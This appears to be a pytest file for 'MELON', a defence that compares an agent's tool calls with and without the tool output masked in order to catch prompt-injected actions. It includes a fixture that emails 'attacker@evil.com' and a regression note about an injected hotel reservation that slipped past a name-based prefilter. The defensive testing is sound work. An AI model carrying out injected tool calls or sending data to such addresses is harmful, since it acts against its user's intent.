from middleware.melon.engine import run_melon_check
from middleware.melon.prefilter import is_sensitive, should_run_melon_check
from middleware.melon.types import ToolCall


def test_is_sensitive_matches_side_effecting_tool_names():
    assert is_sensitive(ToolCall(name="send_email", arguments={}))
    assert is_sensitive(ToolCall(name="delete_file", arguments={}))
    assert is_sensitive(ToolCall(name="transfer_funds", arguments={}))


def test_is_sensitive_false_for_read_only_tool_names():
    assert not is_sensitive(ToolCall(name="read_calendar", arguments={}))
    assert not is_sensitive(ToolCall(name="search_inbox", arguments={}))
    assert not is_sensitive(ToolCall(name="list_files", arguments={}))


def test_should_run_melon_check_true_if_any_call_is_sensitive():
    calls = [
        ToolCall(name="read_calendar", arguments={}),
        ToolCall(name="send_email", arguments={}),
    ]
    assert should_run_melon_check(calls) is True


def test_should_run_melon_check_false_if_no_calls():
    assert should_run_melon_check([]) is False


def test_should_run_melon_check_false_if_all_calls_read_only():
    calls = [
        ToolCall(name="read_calendar", arguments={}),
        ToolCall(name="list_files", arguments={}),
    ]
    assert should_run_melon_check(calls) is False


def test_run_melon_check_skips_masked_run_when_not_sensitive():
    call_log: list[list[dict]] = []

    def fake_agent_call_fn(messages: list[dict]) -> list[ToolCall]:
        call_log.append(messages)
        return [ToolCall(name="read_calendar", arguments={"date": "tomorrow"})]

    original_calls = [ToolCall(name="read_calendar", arguments={"date": "tomorrow"})]
    verdict = run_melon_check(original_calls, tool_output_text="", agent_call_fn=fake_agent_call_fn)

    assert verdict.ran is False
    assert verdict.verdict == "safe"
    assert verdict.distance is None
    assert len(call_log) == 0, "masked run should not have been invoked"


def test_run_melon_check_runs_masked_pass_when_sensitive():
    call_log: list[list[dict]] = []

    def fake_agent_call_fn(messages: list[dict]) -> list[ToolCall]:
        call_log.append(messages)
        return [ToolCall(name="send_email", arguments={"to": "attacker@evil.com", "body": "x"})]

    original_calls = [ToolCall(name="send_email", arguments={"to": "attacker@evil.com", "body": "x"})]
    verdict = run_melon_check(original_calls, tool_output_text="some tool output", agent_call_fn=fake_agent_call_fn)

    assert verdict.ran is True
    assert len(call_log) == 1, "masked run should have been invoked exactly once"


def test_an_unnamed_side_effect_tool_is_still_sensitive():
    """Deny-by-default. An allowlist of "sensitive" verbs is fail-open: the
    travel suite's reserve_hotel matched none of them, was dropped before the
    comparison ran, and its injected reservation passed even though the masked
    run reproduced it with byte-identical arguments."""
    from middleware.melon.prefilter import is_sensitive
    from middleware.melon.types import ToolCall

    for name in ("reserve_hotel", "create_calendar_event", "frobnicate_the_widget"):
        assert is_sensitive(ToolCall(name, {})), name


def test_reads_stay_exempt():
    """The masked conversation opens with its own read_file, so a read in the
    original run would match one by construction."""
    from middleware.melon.prefilter import is_sensitive, should_run_melon_check
    from middleware.melon.types import ToolCall

    for name in ("get_hotels_prices", "read_email", "search_files", "list_files"):
        assert not is_sensitive(ToolCall(name, {})), name
    assert not should_run_melon_check([ToolCall("get_balance", {})])


def test_the_exact_reserve_hotel_pair_that_slipped_through_now_converges():
    """Regression for the two remaining in-scope misses: identical arguments,
    scored 0.488 apart because the call never reached the comparison."""
    from middleware.melon.compare import compare
    from middleware.melon.types import ToolCall

    call = ToolCall(
        "reserve_hotel",
        {"hotel": "Riverside View Hotel", "start_day": "2024-05-13", "end_day": "2024-05-17"},
    )
    verdict = compare([call], [call])

    assert verdict.verdict == "block"
    assert verdict.distance is not None and verdict.distance < 0.05
